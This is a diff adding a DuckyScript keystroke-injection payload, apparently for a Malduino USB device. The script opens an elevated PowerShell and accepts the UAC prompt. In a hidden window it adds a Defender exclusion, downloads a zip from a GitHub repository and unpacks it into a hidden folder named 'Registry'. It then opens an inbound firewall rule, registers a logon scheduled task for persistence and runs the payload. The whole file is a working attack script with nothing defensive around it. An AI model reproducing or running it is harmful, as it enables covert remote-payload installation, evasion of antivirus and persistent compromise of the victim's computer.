@@ -1,0 +1,31 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING PowerShell Start-Process -Verb runAs PowerShell
+ENTER
+DELAY 5000
+ALT y
+ALT t
+DELAY 5000
+REM Resize PowerShell window
+STRING mode con cols=20 lines=1
+ENTER
+REM Run payload in hidden window
+STRING Start-Process -WindowStyle Hidden PowerShell "
+REM Payload
+STRING cd C:\Windows;
+STRING Add-MpPreference -ExclusionPath C:\Windows\Registry;
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+STRING Invoke-WebRequest -Uri github.com/Gyanbu/MalduinoScripts/raw/master/Registry.zip -OutFile C:\Windows\Registry.zip;
+STRING Expand-Archive -Path Registry.zip -force;
+STRING Remove-Item Registry.zip;
+STRING cd Registry;
+STRING attrib +s +h /s /d;
+STRING attrib +s +h .;
+STRING New-NetFirewallRule -DisplayName 'Registry' -Direction Inbound -Program 'C:\Windows\Registry\Registry.exe' -Action Allo
+STRING w;
+STRING Register-ScheduledTask Registry -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Registry\Registry.vbs' -WorkingDi
+STRING rectory 'C:\Windows\Registry') -Trigger (New-ScheduledTaskTrigger -AtLogon) -f;
+STRING .\Registry.vbs
+STRING ";exit
+ENTER
